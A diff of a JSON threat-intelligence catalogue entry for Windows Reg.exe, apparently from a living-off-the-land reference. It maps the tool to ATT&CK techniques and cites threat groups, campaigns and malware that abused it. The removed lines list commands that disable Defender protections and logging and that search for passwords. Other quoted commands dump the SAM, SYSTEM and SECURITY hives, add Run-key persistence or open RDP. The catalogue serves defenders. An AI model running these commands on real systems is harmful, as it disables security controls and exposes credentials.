@@ -1,13 +1,29 @@
 {
   "type": "lolbin",
-  "version": 1,
+  "version": 2,
   "id": "cc31e472-8787-49f7-be75-65d74ed949dd",
   "created_by_ref": "@Nounou_Mbeiri",
-  "created": "2024-01-01T00:00",
-  "modified": "2023-01-01T00:00",
+  "created": "2024-01-01T00:00:00.000Z",
+  "modified": "2026-10-16T00:00:00.000Z",
   "name": "Reg.exe",
-  "description": "Reg is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. [1]\\n\\nUtilities such as Reg are known to be used by persistent threats.",
-  "Required_privilege": [
+  "image": "reg.exe",
+  "description": "Reg is a Windows utility used to interact with the Windows Registry. It can be used at the command-line interface to query, add, modify, and remove information. Utilities such as Reg are known to be used by persistent threats.",
+  "attack": {
+    "id": "S0075",
+    "name": "Reg",
+    "type": "software",
+    "url": "https://attack.mitre.org/software/S0075",
+    "version": "20.0"
+  },
+  "summary": [
+    "Interact with and modify the Windows Registry of a local or remote system",
+    "Gather details from the Windows Registry of a local or remote system",
+    "Find/Extract credentials from the Registry",
+    "Check for installed software on the system",
+    "Retrieve proxy information in the Registry",
+    "Remove/Deactivate security settings eg.(AV/EDR/FW/UAC)"
+  ],
+  "required_privileges": [
     "User",
     "Administrator"
   ],
@@ -15,152 +31,867 @@
     "c:\\windows\\system32\\reg.exe",
     "c:\\windows\\syswow64\\reg.exe"
   ],
-  "hashe": "227F63E1D9008B36BDBCC4B397780BE4",
-  "associated_kill_chain_phases": [
-    "TA0005:Defense Evasion:T1112",
-    "TA0007:Discovery:T1012",
-    "TA0006:Credential Access:T1552.002"
-  ],
+  "hashes": {
+    "MD5": "227F63E1D9008B36BDBCC4B397780BE4"
+  },
   "capabilities": [
     "Reconnaissance",
     "Dump"
   ],
-  "relationship": [
-    {
-      "associated_apts": [
-        "Turla",
-        "OilRig",
-        "Rancor",
-        "Dragonfly",
-        "GALLIUM",
-        "Volt Typhoon",
-        "BianLian Ransomware Group"
-      ],
-      "Relationship Reg.exe -> APTs": [
-        "[Wizard Spider](https://attack.mitre.org/groups/G0102) has modified the Registry key <code>HKLM\\System\\CurrentControlSet\\Control\\SecurityProviders\\WDigest</code> by setting the <code>UseLogonCredential</code> registry value to <code>1</code> in order to force credentials to be stored in clear text in memory. [Wizard Spider](https://attack.mitre.org/groups/G0102) has also modified the WDigest registry key to allow plaintext credentials to be cached in memory.(Citation: CrowdStrike Grim Spider May 2019)(Citation: Mandiant FIN12 Oct 2021)",
-        "[Magic Hound](https://attack.mitre.org/groups/G0059) has modified Registry settings for security tools.(Citation: DFIR Report APT35 ProxyShell March 2022)",
-        "[Kimsuky](https://attack.mitre.org/groups/G0094) has modified Registry settings for default file associations to enable all macros and for persistence.(Citation: CISA AA20-301A Kimsuky)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: Talos Kimsuky Nov 2021)(Citation: KISA Operation Muzabi)",
-        "[Dragonfly](https://attack.mitre.org/groups/G0035) has modified the Registry to perform multiple techniques through the use of [Reg](https://attack.mitre.org/software/S0075).(Citation: US-CERT TA18-074A)",
-        "[APT32](https://attack.mitre.org/groups/G0050)'s backdoor has modified the Windows Registry to store the backdoor's configuration. (Citation: ESET OceanLotus Mar 2019) ",
-        "[Earth Lusca](https://attack.mitre.org/groups/G1006) modified the registry using the command <code>reg add “HKEY_CURRENT_USER\\Environment” /v UserInitMprLogonScript /t REG_SZ /d “[file path]”</code> for persistence.(Citation: TrendMicro EarthLusca 2022)",
-        "A [Patchwork](https://attack.mitre.org/groups/G0040) payload deletes Resiliency Registry keys created by Microsoft Office applications in an apparent effort to trick users into thinking there were no issues during application runs.(Citation: TrendMicro Patchwork Dec 2017)",
-        "[TA505](https://attack.mitre.org/groups/G0092) has used malware to disable Windows Defender through modification of the Registry.(Citation: Korean FSI TA505 2020)",
-        "[Turla](https://attack.mitre.org/groups/G0010) has modify Registry values to store payloads.(Citation: ESET Turla PowerShell May 2019)(Citation: Symantec Waterbug Jun 2019)",
-        "[APT19](https://attack.mitre.org/groups/G0073) uses a Port 22 malware variant to modify several Registry keys.(Citation: Unit 42 C0d0so0 Jan 2016)",
-        "[FIN8](https://attack.mitre.org/groups/G0061) has deleted Registry keys during post compromise cleanup activities.(Citation: FireEye Know Your Enemy FIN8 Aug 2016)",
-        "[Gamaredon Group](https://attack.mitre.org/groups/G0047) has removed security settings for VBA macro execution by changing registry values <code>HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\VBAWarnings</code> and <code>HKCU\\Software\\Microsoft\\Office\\&lt;version&gt;\\&lt;product&gt;\\Security\\AccessVBOM</code>.(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021)",
-        "[Gorgon Group](https://attack.mitre.org/groups/G0078) malware can deactivate security mechanisms in Microsoft Office by editing several keys and values under <code>HKCU\\Software\\Microsoft\\Office\\</code>.(Citation: Unit 42 Gorgon Group Aug 2018)",
-        "[Blue Mockingbird](https://attack.mitre.org/groups/G0108) has used Windows Registry modifications to specify a DLL payload.(Citation: RedCanary Mockingbird May 2020) ",
-        "[Silence](https://attack.mitre.org/groups/G0091) can create, delete, or modify a specified Registry key or value.(Citation: Group IB Silence Sept 2018)",
-        "[LuminousMoth](https://attack.mitre.org/groups/G1014) has used malware that adds Registry keys for persistence.(Citation: Kaspersky LuminousMoth July 2021)(Citation: Bitdefender LuminousMoth July 2021)",
-        "[Ember Bear](https://attack.mitre.org/groups/G1003) has used an open source batch script to modify Windows Defender registry keys.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 )",
-        "[APT41](https://attack.mitre.org/groups/G0096) used a malware variant called GOODLUCK to modify the registry in order to steal credentials.(Citation: FireEye APT41 Aug 2019)(Citation: Group IB APT 41 June 2021)",
-        "A [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool has created new Registry keys under `HKEY_CURRENT_USER\\Software\\Classes\\` and `HKLM\\SYSTEM\\CurrentControlSet\\services`.(Citation: Nccgroup Emissary Panda May 2018)(Citation: Trend Micro Iron Tiger April 2021)",
-        "[APT38](https://attack.mitre.org/groups/G0082) uses a tool called CLEANTOAD that has the capability to modify Registry keys.(Citation: FireEye APT38 Oct 2018)",
-        "[Turla](https://attack.mitre.org/groups/G0010) surveys a system upon check-in to discover information in the Windows Registry with the <code>reg query</code> command.(Citation: Kaspersky Turla) [Turla](https://attack.mitre.org/groups/G0010) has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes .(Citation: ESET Turla PowerShell May 2019)",
-        "[Kimsuky](https://attack.mitre.org/groups/G0094) has obtained specific Registry keys and values on a compromised host.(Citation: Talos Kimsuky Nov 2021)",
-        "[OilRig](https://attack.mitre.org/groups/G0049) has used <code>reg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default”</code> on a victim to query the Registry.(Citation: Palo Alto OilRig May 2016)",
-        "[Stealth Falcon](https://attack.mitre.org/groups/G0038) malware attempts to determine the installed version of .NET by querying the Registry.(Citation: Citizen Lab Stealth Falcon May 2016)",
-        "A [Threat Group-3390](https://attack.mitre.org/groups/G0027) tool can read and decrypt stored Registry values.(Citation: Nccgroup Emissary Panda May 2018)",
-        "[Dragonfly](https://attack.mitre.org/groups/G0035) has queried the Registry to identify victim information.(Citation: US-CERT TA18-074A)",
-        "[APT32](https://attack.mitre.org/groups/G0050)'s backdoor can query the Windows Registry to gather system information. (Citation: ESET OceanLotus Mar 2019)",
-        "[APT39](https://attack.mitre.org/groups/G0087) has used various strains of malware to query the Registry.(Citation: FBI FLASH APT39 September 2020)",
-        "[Volt Typhoon](https://attack.mitre.org/groups/G1017) has queried the Registry on compromised systems, reg query hklm\\software\\, for information on installed software.(Citation: Joint Cybersecurity Advisory Volt Typhoon June 2023)",
-        "[ZIRCONIUM](https://attack.mitre.org/groups/G0128) has used a tool to query the Registry for proxy settings.(Citation: Zscaler APT31 Covid-19 October 2020)",
-        "[Chimera](https://attack.mitre.org/groups/G0114) has queried Registry keys using <code>reg query \\<host>\\HKU\\<SID>\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers</code> and <code>reg query \\<host>\\HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings</code>.(Citation: NCC Group Chimera January 2021)",
-        "[Lazarus Group](https://attack.mitre.org/groups/G0032) malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another [Lazarus Group](https://attack.mitre.org/groups/G0032) malware sample checks for the presence of the following Registry key:<code>HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt</code>.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee Lazarus Resurfaces Feb 2018)",
-        "[Fox Kitten](https://attack.mitre.org/groups/G0117) has accessed Registry hives ntuser.dat and UserClass.dat.(Citation: CISA AA20-259A Iran-Based Actor September 2020)",
-        "[APT32](https://attack.mitre.org/groups/G0050) used Outlook Credential Dumper to harvest credentials stored in Windows registry.(Citation: Cybereason Oceanlotus May 2017)(Citation: Cybereason Cobalt Kitty 2017)"
-      ],
-      "Relationship Reg.exe -> TTPs": [
-        "[Reg](https://attack.mitre.org/software/S0075) may be used to interact with and modify the Windows Registry of a local or remote system at the command-line interface.(Citation: Microsoft Reg)",
-        "[Reg](https://attack.mitre.org/software/S0075) may be used to find credentials in the Windows Registry.(Citation: Pentestlab Stored Credentials)",
-        "[Reg](https://attack.mitre.org/software/S0075) may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.(Citation: Microsoft Reg)"
-      ],
-      "associated_campaigns": [
-        "Operation Honeybee"
-      ],
-      "associated_Malware": [
-        "Query Registry",
-        "Modify Registry",
-        "Credentials in Registry",
-        "Security Account Manager",
-        "NTFS File Attributes"
-      ],
-      "associated_commands": [
-        "reg delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f",
-        "reg add \"HKLM\\Software\\Polics\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"o\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t",
-        "REG_DWORD /d \"1\" /f reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccess Protection\" /t REG_DWORD /d \"1\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOn RealtimeEnable\" /t REG_DWORD /d \"1\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"Disable EnhancedNotifications\" /t REG_DWORD /d\"1\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"Spynet Reporting\" /t REG_DWORD /d \"0\" /f",
-        "reg add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"2\" /f",
-        "rem 0 Disable Logging",
-        "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
-        "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f",
-        "rem Disable WD Tasks",
-        "schtasks /Change /TN \"Microsoft\\Windows\\ExploitGuard\\ExploitGuard MDM policy Refresh\" /Disable",
-        "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cache Maintenance\" /Disable",
-        "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Cleanup\" /Disable",
-        "schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Scheduled Scan\" /Disable schtasks /Change /TN \"Microsoft\\Windows\\Windows Defender\\Windows Defender Verification\" /Disable",
-        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f",
-        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\DomainProfile\\GloballyOpenPorts\\List\" /v 3389:TCP /t REG_SZ /d \"3389:TCP:*:Enabled:Remote Desktop\" /f",
-        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f",
-        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f",
-        "reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Licensing Core\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f",
-        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v EnableConcurrentSessions /t REG_DWORD /d 1 /f",
-        "reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AllowMultipleTSSessions /t REG_DWORD /d 1 /f",
-        "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows NT\\Terminal Services\" /v MaxInstanceCount /t REG_DWORD /d 100 /f",
-        "reg add \"HKEY_CURRENT_USER\\Environment\" /v UserInitMprLogonScript /t REG_SZ /d \"[file path]\" ",
-        "/c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\"\"Local Machine Hive: ",
-        "reg query HKLM /f password /t REG_SZ /s\" \"Current User Hive: reg query HKCU /f password /t REG_SZ /s"
-      ]
-    }
-  ],
   "platforms": [
     "windows"
   ],
-  "detections": [
+  "associated_kill_chain_phases": [
+    "TA0112:Defense Impairment:T1112",
+    "TA0003:Persistence:T1112",
+    "TA0007:Discovery:T1012",
+    "TA0006:Credential Access:T1552.002",
+    "TA0006:Credential Access:T1003.002",
+    "TA0005:Stealth:T1564.004"
+  ],
+  "relationship": {
+    "associated_apts": [
+      {
+        "name": "APT29",
+        "attack_id": "G0016",
+        "evidence": "names reg.exe",
+        "description": "APT29 has used the `reg save` command to extract LSA secrets offline. APT29 has used the `reg save` command to save registry hives.",
+        "sources": "Mandiant APT29 Eye Spy Email Nov 22 https://www.mandiant.com/resources/blog/unc3524-eye-spy-email"
+      },
+      {
+        "name": "APT41",
+        "attack_id": "G0096",
+        "evidence": "names reg.exe",
+        "description": "APT41 extracted user account data from the Security Account Managerr (SAM), making a copy of this database from the registry using the reg save command or by exploiting volume shadow copies.",
+        "sources": "Rostovcev APT41 2021 https://www.group-ib.com/blog/apt41-world-tour-2021/"
+      },
+      {
+        "name": "BianLian Ransomware Group",
+        "attack_id": null,
+        "evidence": "reported by CISA AA23-136A BianLian Ransomware Group May 2023",
+        "description": "reg.exe add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f (\"Adds/overwrites a new Registry value to allow a user to receive help from Remote Assistance.\")",
+        "sources": "CISA AA23-136A BianLian Ransomware Group May 2023 https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-136a"
+      },
+      {
+        "name": "Chimera",
+        "attack_id": "G0114",
+        "evidence": "names reg.exe",
+        "description": "Chimera has queried Registry keys using reg query \\<host>\\HKU\\<SID>\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers and reg query \\<host>\\HKU\\<SID>\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.",
+        "sources": "NCC Group Chimera January 2021 https://web.archive.org/web/20230218064220/https://research.nccgroup.com/2021/01/12/abusing-cloud-services-to-fly-under-the-radar/"
+      },
+      {
+        "name": "Daggerfly",
+        "attack_id": "G1034",
+        "evidence": "uses S0075; names reg.exe",
+        "description": "Daggerfly has used Reg to dump various Windows registry hives from victim machines. Daggerfly used Reg to dump the Security Account Manager (SAM) hive from victim machines for follow-on credential extraction. Daggerfly used Reg to dump the Security Account Manager (SAM), System, and Security Windows registry hives from victim machines.",
+        "sources": "Symantec Daggerfly 2023 https://symantec-enterprise-blogs.security.com/threat-intelligence/apt-attacks-telecoms-africa-mgbot"
+      },
+      {
+        "name": "Dragonfly",
+        "attack_id": "G0035",
+        "evidence": "uses S0075; names reg.exe",
+        "description": "Dragonfly has modified the Registry to perform multiple techniques through the use of Reg.",
+        "sources": "US-CERT TA18-074A https://www.us-cert.gov/ncas/alerts/TA18-074A"
+      },
+      {
+        "name": "Earth Lusca",
+        "attack_id": "G1006",
+        "evidence": "names reg.exe",
+        "description": "Earth Lusca modified the registry using the command reg add “HKEY_CURRENT_USER\\Environment” /v UserInitMprLogonScript /t REG_SZ /d “[file path]” for persistence.",
+        "sources": "TrendMicro EarthLusca 2022 https://www.trendmicro.com/content/dam/trendmicro/global/en/research/22/a/earth-lusca-employs-sophisticated-infrastructure-varied-tools-and-techniques/technical-brief-delving-deep-an-analysis-of-earth-lusca-operations.pdf"
+      },
+      {
+        "name": "Ember Bear",
+        "attack_id": "G1003",
+        "evidence": "names reg.exe",
+        "description": "Ember Bear acquires victim credentials by extracting registry hives such as the Security Account Manager through commands such as reg save.",
+        "sources": "Cadet Blizzard emerges as novel threat actor https://www.microsoft.com/en-us/security/blog/2023/06/14/cadet-blizzard-emerges-as-a-novel-and-distinct-russian-threat-actor/; CISA GRU29155 2024 https://www.cisa.gov/sites/default/files/2024-09/aa24-249a-russian-military-cyber-actors-target-us-and-global-critical-infrastructure.pdf"
+      },
+      {
+        "name": "FIN13",
+        "attack_id": "G1016",
+        "evidence": "names reg.exe",
+        "description": "FIN13 has extracted the SAM and SYSTEM registry hives using the `reg.exe` binary for obtaining password hashes from a compromised machine.",
+        "sources": "Sygnia Elephant Beetle Jan 2022 https://web.archive.org/web/20220105132433/https://f.hubspotusercontent30.net/hubfs/8776530/Sygnia-%20Elephant%20Beetle_Jan2022.pdf"
+      },
+      {
+        "name": "GALLIUM",
+        "attack_id": "G0093",
+        "evidence": "uses S0075; names reg.exe",
+        "description": "GALLIUM used reg commands to dump specific hives from the Windows Registry, such as the SAM hive, and obtain password hashes.",
+        "sources": "Cybereason Soft Cell June 2019 https://www.cybereason.com/blog/operation-soft-cell-a-worldwide-campaign-against-telecommunications-providers"
+      },
+      {
+        "name": "Gamaredon Group",
+        "attack_id": "G0047",
+        "evidence": "uses S0075; names reg.exe",
+        "description": "Gamaredon Group has used Reg to add Run keys to the Registry. Gamaredon Group has used various legitimate tools, such as `mshta.exe` and Reg, and services during operations. Gamaredon Group has replicated to removable media by leveraging the User Assist Reg Key and creating LNKs on all network and removable drives available on the infected host.",
+        "sources": "unit42_gamaredon_dec2022 https://unit42.paloaltonetworks.com/trident-ursa/; ESET Gamaredon Sept2024 https://web-assets.esetstatic.com/wls/en/papers/white-papers/cyberespionage-gamaredon-way.pdf; SymantecCarbonBlack_ShuckwormUSB_Apr2025 https://www.security.com/threat-intelligence/shuckworm-ukraine-gammasteel"
+      },
+      {
+        "name": "Kimsuky",
+        "attack_id": "G0094",
+        "evidence": "names reg.exe",
+        "description": "Kimsuky has run reg add ‘HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList’ /v to hide a newly created user.",
+        "sources": "KISA Operation Muzabi https://web.archive.org/web/20220328121326/https://boho.or.kr/filedownload.do?attach_file_seq=2695&attach_file_id=EpF2695.pdf"
+      },
+      {
+        "name": "Lotus Blossom",
+        "attack_id": "G0030",
+        "evidence": "names reg.exe",
+        "description": "Lotus Blossom has run commands such as `reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\[service name]\\Parameters` to verify if installed implants are running as a service.",
+        "sources": "Cisco LotusBlossom 2025 https://blog.talosintelligence.com/lotus-blossom-espionage-group/"
+      },
+      {
+        "name": "Mustang Panda",
+        "attack_id": "G0129",
+        "evidence": "names reg.exe",
+        "description": "Mustang Panda has used vssadmin to create a volume shadow copy and retrieve the NTDS.dit file. Mustang Panda has also used reg save on the SYSTEM file Registry location to help extract the NTDS.dit file.",
+        "sources": "Secureworks BRONZE PRESIDENT December 2019 https://www.secureworks.com/research/bronze-president-targets-ngos; Palo Alto Unit42 STATELY TAURUS TONESHELL September 2023 https://unit42.paloaltonetworks.com/stately-taurus-attacks-se-asian-government/"
+      },
+      {
+        "name": "OilRig",
+        "attack_id": "G0049",
+        "evidence": "uses S0075; names reg.exe",
+        "description": "OilRig has used reg.exe to modify system configuration. OilRig has used reg query “HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default” on a victim to query the Registry.",
+        "sources": "Trend Micro Earth Simnavaz October 2024 https://www.trendmicro.com/en_us/research/24/j/earth-simnavaz-cyberattacks.html; Symantec Crambus OCT 2023 https://www.security.com/threat-intelligence/crambus-middle-east-government; Palo Alto OilRig May 2016 http://researchcenter.paloaltonetworks.com/2016/05/the-oilrig-campaign-attacks-on-saudi-arabian-organizations-deliver-helminth-backdoor/"
+      },
+      {
+        "name": "Rancor",
+        "attack_id": "G0075",
+        "evidence": "uses S0075"
+      },
+      {
+        "name": "Turla",
+        "attack_id": "G0010",
+        "evidence": "uses S0075; names reg.exe",
+        "description": "Turla surveys a system upon check-in to discover information in the Windows Registry with the reg query command. Turla has also retrieved PowerShell payloads hidden in Registry keys as well as checking keys associated with null session named pipes.",
+        "sources": "Kaspersky Turla https://securelist.com/the-epic-turla-operation/65545/; ESET Turla PowerShell May 2019 https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/"
+      },
+      {
+        "name": "Volt Typhoon",
+        "attack_id": "G1017",
+        "evidence": "uses S0075; names reg.exe",
+        "description": "Volt Typhoon has queried the Registry on compromised systems, `reg query hklm\\software\\`, for information on installed software including PuTTY.",
+        "sources": "CISA AA24-038A PRC Critical Infrastructure February 2024 https://www.cisa.gov/sites/default/files/2024-03/aa24-038a_csa_prc_state_sponsored_actors_compromise_us_critical_infrastructure_3.pdf; Joint Cybersecurity Advisory Volt Typhoon June 2023 https://media.defense.gov/2023/May/24/2003229517/-1/-1/0/CSA_Living_off_the_Land.PDF"
+      }
+    ],
+    "associated_campaigns": [
+      {
+        "name": "APT28 Nearest Neighbor Campaign",
+        "attack_id": "C0051",
+        "evidence": "names reg.exe",
+        "description": "During APT28 Nearest Neighbor Campaign, APT28 used the following commands to dump SAM, SYSTEM, and SECURITY hives: reg save hklm\\sam, reg save hklm\\system, and reg save hklm\\security.",
+        "sources": "Nearest Neighbor Volexity https://www.volexity.com/blog/2024/11/22/the-nearest-neighbor-attack-how-a-russian-apt-weaponized-nearby-wi-fi-networks-for-covert-access/"
+      },
+      {
+        "name": "Operation CuckooBees",
+        "attack_id": "C0012",
+        "evidence": "names reg.exe",
+        "description": "During Operation CuckooBees, the threat actors leveraged a custom tool to dump OS credentials and used following commands: `reg save HKLM\\SYSTEM system.hiv`, `reg save HKLM\\SAM sam.hiv`, and `reg save HKLM\\SECURITY security.hiv`, to dump SAM, SYSTEM and SECURITY hives.",
+        "sources": "Cybereason OperationCuckooBees May 2022 https://www.cybereason.com/blog/operation-cuckoobees-deep-dive-into-stealthy-winnti-techniques"
+      },
+      {
+        "name": "Operation Digital Eye",
+        "attack_id": "C0061",
+        "evidence": "names reg.exe",
+        "description": "During Operation Digital Eye, threat actors used `reg save` to retrieve credentials from the Security Account Manager (SAM) database.",
+        "sources": "sentinelone operationDigitalEye Dec 2024 https://www.sentinelone.com/labs/operation-digital-eye-chinese-apt-compromises-critical-digital-infrastructure-via-visual-studio-code-tunnels/"
+      },
+      {
+        "name": "Operation Honeybee",
+        "attack_id": "C0006",
+        "evidence": "uses S0075"
+      },
+      {
+        "name": "Operation Wocao",
+        "attack_id": "C0014",
+        "evidence": "names reg.exe",
+        "description": "During Operation Wocao, the threat actors executed `/c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\` to detect recent PuTTY sessions, likely to further lateral movement.",
+        "sources": "FoxIT Wocao December 2019 https://www.fox-it.com/media/kadlze5c/201912_report_operation_wocao.pdf"
+      }
+    ],
+    "associated_malware": [
+      {
+        "name": "BabyShark",
+        "attack_id": "S0414",
+        "evidence": "names reg.exe",
+        "description": "BabyShark has executed the reg query command for HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default.",
+        "sources": "Unit42 BabyShark Feb 2019 https://unit42.paloaltonetworks.com/new-babyshark-malware-targets-u-s-national-security-think-tanks/"
+      },
+      {
+        "name": "Epic",
+        "attack_id": "S0091",
+        "evidence": "names reg.exe",
+        "description": "Epic uses the rem reg query command to obtain values from Registry keys.",
+        "sources": "Kaspersky Turla https://securelist.com/the-epic-turla-operation/65545/"
+      },
+      {
+        "name": "HeartCrypt",
+        "attack_id": "S9018",
+        "evidence": "names reg.exe",
+        "description": "HeartCrypt can use the `reg add` command via `cmd.exe` for Registry modification.",
+        "sources": "Palo Alto HeartCrypt DEC 2024 https://unit42.paloaltonetworks.com/packer-as-a-service-heartcrypt-malware/"
+      },
+      {
+        "name": "KeyBoy",
+        "attack_id": "S0387",
+        "evidence": "names reg.exe",
+        "description": "KeyBoy issues the command reg add “HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon” to achieve persistence.",
+        "sources": "CitizenLab KeyBoy Nov 2016 https://citizenlab.ca/2016/11/parliament-keyboy/; PWC KeyBoys Feb 2017 https://web.archive.org/web/20211129064701/https://www.pwc.co.uk/issues/cyber-security-services/research/the-keyboys-are-back-in-town.html"
+      },
+      {
+        "name": "PLAINTEE",
+        "attack_id": "S0254",
+        "evidence": "names reg.exe",
+        "description": "PLAINTEE uses reg add to add a Registry Run key for persistence.",
+        "sources": "Rancor Unit42 June 2018 https://researchcenter.paloaltonetworks.com/2018/06/unit42-rancor-targeted-attacks-south-east-asia-using-plaintee-ddkong-malware-families/"
+      },
+      {
+        "name": "POWRUNER",
+        "attack_id": "S0184",
+        "evidence": "names reg.exe",
+        "description": "POWRUNER may query the Registry by running reg query on a victim.",
+        "sources": "FireEye APT34 Dec 2017 https://www.fireeye.com/blog/threat-research/2017/12/targeted-attack-in-middle-east-by-apt34.html"
+      },
+      {
+        "name": "PUBLOAD",
+        "attack_id": "S1228",
+        "evidence": "names reg.exe",
+        "description": "PUBLOAD has queried Registry values to identify software using `reg query`.",
+        "sources": "Trend Micro MUSTANG PANDA PUBLOAD HIUPAN SEPTEMBER 2024 https://www.trendmicro.com/en_us/research/24/i/earth-preta-new-malware-and-strategies.html"
+      },
+      {
+        "name": "RATANKBA",
+        "attack_id": "S0241",
+        "evidence": "names reg.exe",
+        "description": "RATANKBA uses the command reg query “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings”.",
+        "sources": "RATANKBA https://www.trendmicro.com/en_us/research/17/b/ratankba-watering-holes-against-enterprises.html"
+      },
+      {
+        "name": "SMOKEDHAM",
+        "attack_id": "S0649",
+        "evidence": "names reg.exe",
+        "description": "SMOKEDHAM has used reg.exe to create a Registry Run key.",
+        "sources": "FireEye SMOKEDHAM June 2021 https://www.fireeye.com/blog/threat-research/2021/06/darkside-affiliate-supply-chain-software-compromise.html"
+      },
+      {
+        "name": "The Gentlemen Ransomware",
+        "attack_id": "S9051",
+        "evidence": "names reg.exe",
+        "description": "The Gentlemen Ransomware has written registry keys within HKLM and HKCU to gain persistence device wide and to have redundancy. The Gentlemen Ransomware has added registry keys to maintain persistence through `reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v GupdateS /t REG_SZ /d “<malware_path>” /f` and `reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v GupdateU /t REG_SZ /d “<malware_path>” /f`.",
+        "sources": "CheckPointResearch_TheGentlemen_April2026 https://research.checkpoint.com/2026/dfir-report-the-gentlemen/; MSTI_GentelmenRansomware_May2026 https://www.microsoft.com/en-us/security/blog/2026/05/28/the-gentlemen-ransomware-dissecting-a-self-propagating-go-encryptor/"
+      },
+      {
+        "name": "Ursnif",
+        "attack_id": "S0386",
+        "evidence": "names reg.exe",
+        "description": "Ursnif has used Reg to query the Registry for installed programs.",
